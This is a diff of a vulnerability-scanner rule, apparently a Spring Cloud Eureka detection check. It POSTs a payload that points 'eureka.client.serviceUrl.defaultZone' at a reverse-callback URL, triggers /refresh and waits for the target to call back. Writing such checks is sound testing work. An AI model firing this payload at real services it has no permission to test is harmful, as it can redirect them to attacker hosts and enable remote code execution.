@@ -5,10 +5,10 @@ rules:
     body: 'eureka.client.serviceUrl.defaultZone={{reverse_url}}'
     follow_redirects: true
     expression: >
-      status==200 &&  r'eureka.client.serviceUrl.defaultZone="(.+?)"'.bmatches(body)
+      status==200 &&  body.bcontains(b"eureka.client.serviceUrl.defaultZone")
   - method: POST
     path: /refresh
-    body: 'eureka.client.serviceUrl.defaultZone={{reverse_url}}'
+    body: ''
     follow_redirects: true
     expression: >
       status==200 && waitReverse(5)
